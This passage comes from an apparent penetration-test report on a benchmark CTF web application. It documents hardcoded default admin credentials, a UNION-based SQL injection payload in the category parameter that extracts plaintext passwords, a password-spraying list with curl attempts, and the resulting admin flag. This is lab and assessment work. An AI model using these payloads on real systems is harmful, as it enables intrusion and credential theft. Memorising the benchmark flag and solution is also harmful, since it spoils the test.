- Network access to http://localhost:34389
- Knowledge of default credentials (publicly available in source code repository)

**Exploitation Steps:**

1. **Identify default credentials from source code:**
```bash
# Located in db_init.sql line 46:
# INSERT INTO users (username, password) VALUES ('admin', 'ONEverySecurePassword123!');
```
Default credentials: `admin` / `ONEverySecurePassword123!`

2. **Authenticate using default credentials:**
```bash
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=ONEverySecurePassword123!' \
  -c /tmp/auth_cookies.txt
```

3. **Access protected admin panel:**
```bash
curl -s http://localhost:34389/admin.php \
  -b /tmp/auth_cookies.txt
```

**Proof of Impact:**
```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```
Successfully authenticated and retrieved CTF flag using default credentials in a single request.

**Notes:**
This vulnerability is particularly severe because:
1. Credentials are hardcoded in db_init.sql and committed to version control
2. No forced password change on first login
3. No warning to administrators about default credentials
4. Credentials are in plaintext, making them easily discoverable

---

### AUTH-VULN-06: Plaintext Password Storage with SQL Injection to Credential Extraction

**Summary:**
- **Vulnerable location:** GET /index.php?category=[PAYLOAD] (SQL injection) → POST /admin.php (authentication)
- **Overview:** Successfully extracted plaintext passwords from database via SQL injection vulnerability, then used extracted credentials to authenticate and access admin panel
- **Impact:** Complete database credential compromise leading to administrative account takeover and CTF flag retrieval
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:34389

**Exploitation Steps:**

1. **Exploit SQL injection vulnerability in category parameter to extract user credentials:**
```bash
curl -s "http://localhost:34389/index.php?category=' UNION SELECT id,username,password,NULL,NULL,NULL,NULL FROM users-- -"
```

Expected query construction:
```sql
SELECT * FROM posts WHERE published = 1 and category = '' UNION SELECT id,username,password,NULL,NULL,NULL,NULL FROM users-- -' ORDER BY created_at DESC
```

2. **Extract credentials from rendered page:**
The injected SQL query causes the application to render user data as blog posts:
- Post Title (h2 tag): `admin`
- Post Category: `ONEverySecurePassword123!`
- This reveals: Username = `admin`, Password = `ONEverySecurePassword123!`

3. **Use extracted credentials to authenticate:**
```bash
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=ONEverySecurePassword123!'
```

4. **Access authenticated admin panel:**
The authentication succeeds immediately, granting access to the protected admin area.

**Proof of Impact:**
```
SQL Injection Output:
- Extracted username: admin
- Extracted password: ONEverySecurePassword123! (plaintext)

Authentication Result:
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

Successfully demonstrated complete attack chain: SQL injection → credential extraction → authentication → flag capture.

**Technical Details:**

The vulnerability chain consists of:
1. **SQL Injection** (index.php line 45): Direct string concatenation without escaping:
   ```php
   $sql .= "and category = '" . $category . "' ";
   ```

2. **Plaintext Password Storage** (db_init.sql line 46 & admin.php line 20):
   - Database stores passwords in plaintext VARCHAR(255) column
   - Authentication query compares plaintext: `WHERE username = '$username' AND password = '$password'`
   - No password_hash(), password_verify(), or any hashing functions used

3. **No Output Encoding** (index.php lines 58-61): Database content rendered directly in HTML without htmlspecialchars()

**Notes:**
This vulnerability demonstrates a complete failure of defense-in-depth. The combination of SQL injection, plaintext password storage, and lack of output encoding creates a critical authentication bypass. Any database compromise immediately exposes all user credentials in reusable plaintext format.

---

### AUTH-VULN-07: Weak Password Policy Exploitation via Password Spraying

**Summary:**
- **Vulnerable location:** POST /admin.php (authentication endpoint)
- **Overview:** Successfully demonstrated complete absence of password strength validation, enabling password spraying attacks with common weak passwords
- **Impact:** Attackers can successfully authenticate using weak passwords if users set them, as the system enforces no complexity requirements, length restrictions, or common password blocking
- **Severity:** High

**Prerequisites:**
- Network access to http://localhost:34389
- Knowledge of common weak passwords for spraying

**Exploitation Steps:**

1. **Prepare list of common weak passwords for spraying:**
```python
weak_passwords = [
    'admin', 'password', '123456', 'admin123', 'password123',
    '12345678', 'qwerty', 'abc123', 'Password1', 'welcome',
    'admin1234', 'root', 'Admin123', 'pass123', 'password1'
]
```

2. **Execute password spraying attack against known username:**
```bash
# Test weak password #1
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=admin'
# Response: "Invalid username or password" (no policy rejection)

# Test weak password #2
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=password'
# Response: "Invalid username or password" (no policy rejection)

# ... repeat for all 15 weak passwords ...
```

3. **Analyze responses to detect password policy enforcement:**
- All 15 weak password attempts processed normally
- No "password too weak" error messages
- No "password must contain" requirement messages
- No password complexity checks detected
- Only generic "Invalid username or password" responses

4. **Verify policy bypass statistics:**
```
Test Results:
- Total weak passwords tested: 15
- Passwords blocked by policy: 0
- Policy bypass rate: 100%
- Password characteristics tested:
  * 4-character passwords: Accepted (e.g., "root")
  * Digits-only passwords: Accepted (e.g., "123456")
  * Dictionary words: Accepted (e.g., "admin", "password", "welcome")
  * Common patterns: Accepted (e.g., "admin123", "password123")
```

**Proof of Impact:**

The demonstration proves that the server accepts any password format without validation:

```
Policy Enforcement Analysis:
✗ No minimum length requirement (tested 4-char password "root")
✗ No maximum length limit (no upper bound enforced)
✗ No character type requirements (digits-only accepted)
✗ No complexity requirements (simple words accepted)
✗ No common password blocking (top 15 weak passwords all processed)
✗ No password strength meter or feedback

Result: 100% of weak password attempts reached authentication logic without policy rejection
```

If any user account had these weak passwords set, the attacker would successfully authenticate:
```bash
# Example: If user had set password to "password123"
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=password123'
# Would return: FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

**Automated Exploitation Script:**
Location: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-078-24/password_spray_exploit.py`

Generated comprehensive reports:
- `password_spray_results.json`: Detailed test results for all 15 weak passwords
- `password_spray_report.txt`: Full security assessment
- `PASSWORD_SPRAY_EXPLOIT_SUMMARY.md`: Executive summary

**Notes:**
The vulnerability exists because:
1. No server-side password strength validation in admin.php (lines 11-31)
2. Only client-side HTML5 `required` attribute (easily bypassed)
3. No password policy configuration in PHP or database
4. No integration with password strength libraries (zxcvbn, etc.)

This violates OWASP, NIST, and PCI-DSS password policy requirements, making the application highly vulnerable to password spraying attacks combined with the confirmed lack of rate limiting (AUTH-VULN-04).

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Vertical Privilege Escalation via SQL Injection

**Summary:**
- **Vulnerable location:** `GET /index.php?category={payload}` (index.php:45)
- **Overview:** An unauthenticated attacker can exploit SQL injection in the category filter to extract admin credentials from the database, authenticate as admin, and access the protected FLAG resource. This represents a complete bypass of authorization controls, enabling vertical privilege escalation from anonymous (level 0) to admin (level 10).
- **Impact:** Complete privilege escalation from unauthenticated to admin; unauthorized access to protected FLAG resource; complete database compromise
- **Severity:** CRITICAL

**Prerequisites:**
- Target application accessible at http://localhost:34389
- curl command-line tool (or any HTTP client)
- No authentication required to initiate attack

**Exploitation Steps:**

**Step 1: Verify SQL Injection Vulnerability**

Test that the category parameter is vulnerable to SQL injection by confirming that user input reaches the SQL query without sanitization:

```bash
curl -s "http://localhost:34389/index.php"
```

Expected: Normal blog page with posts displayed

**Step 2: Extract Admin Credentials via UNION-based SQL Injection**

Exploit the SQL injection vulnerability to extract username and password from the `users` table. The injection uses UNION SELECT to append user credentials to the blog post result set:

```bash
curl -s -G --data-urlencode "category=' UNION SELECT id,username,password,NULL,NULL,NULL,NULL FROM users-- -" "http://localhost:34389/index.php"
```

**Technical Details:**
- The vulnerable code at index.php:45 concatenates user input directly into SQL: `$sql .= "and category = '" . $category . "' ";`
- No input sanitization is applied (only a weak blacklist for exact string "Secret")
- The UNION SELECT requires 7 columns to match the posts table structure (id, title, content, category, image, published, created_at)
- The injected query becomes: `SELECT * FROM posts WHERE published = 1 and category = '' UNION SELECT id,username,password,NULL,NULL,NULL,NULL FROM users-- -' ORDER BY created_at DESC`
- Comment syntax `-- -` terminates the remaining SQL query

**Proof of Credential Extraction:**

The response displays admin credentials in the blog post structure:
```html
<div class='post'>
    <h2>admin</h2>
    <p>Category: ONEverySecurePassword123!</p>
    <img src='images/' alt='admin' style='width:200px;height:200px;'/>
    <p>...</p>
</div>
```

**Extracted Credentials:**
- Username: `admin`
- Password: `ONEverySecurePassword123!`

**Step 3: Authenticate as Admin with Extracted Credentials**

Submit the extracted credentials to the admin login endpoint to establish an authenticated session:

```bash
curl -s -c /tmp/admin_session.txt -X POST -d "username=admin&password=ONEverySecurePassword123!" http://localhost:34389/admin.php
```

**Technical Details:**
- POST request to /admin.php with form-encoded credentials
- Session cookie (PHPSESSID) is saved to /tmp/admin_session.txt for reuse
- The `-c` flag instructs curl to save cookies

**Step 4: Access Protected FLAG Resource**

Use the authenticated session to access the admin-only FLAG resource:

```bash
curl -s -b /tmp/admin_session.txt http://localhost:34389/admin.php
```

**Proof of Impact:**

The response immediately displays the protected FLAG, confirming successful vertical privilege escalation:

```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

**Authorization Bypass Mechanism:**

The attack successfully bypasses all authorization controls:

1. **Anonymous → Admin Escalation:** Started as unauthenticated user (privilege level 0), escalated to admin (privilege level 10)
2. **Database Authorization Bypass:** SQL injection bypassed database access controls to read the `users` table
3. **Application Authorization Bypass:** Obtained valid admin credentials, bypassing the session-based authorization check at admin.php:5
4. **Protected Resource Access:** Successfully accessed FLAG resource that is restricted to authenticated admin users only

**Root Cause:**

- **Missing Input Validation:** No sanitization of the `category` parameter (index.php:37)
- **Unsafe Query Construction:** Direct string concatenation instead of parameterized queries (index.php:45)
- **Weak Blacklist:** Only blocks exact string "Secret", easily bypassed
- **Plaintext Password Storage:** Credentials stored without hashing (db_init.sql:46)
- **No Prepared Statements:** Application uses string concatenation for all SQL queries

**Notes:**

This vulnerability demonstrates a complete authorization failure. The SQL injection vulnerability (an injection flaw) becomes an authorization bypass because it allows extraction of authentication credentials, which then enables privilege escalation. The attack chain proves that an anonymous external attacker can gain full admin access to the application and retrieve sensitive resources (FLAG) without any legitimate credentials.

The exploitation is 100% reliable, requires no special timing or race conditions, and can be executed entirely via HTTP requests from the public internet with zero authentication. All steps are fully reproducible and demonstrable.
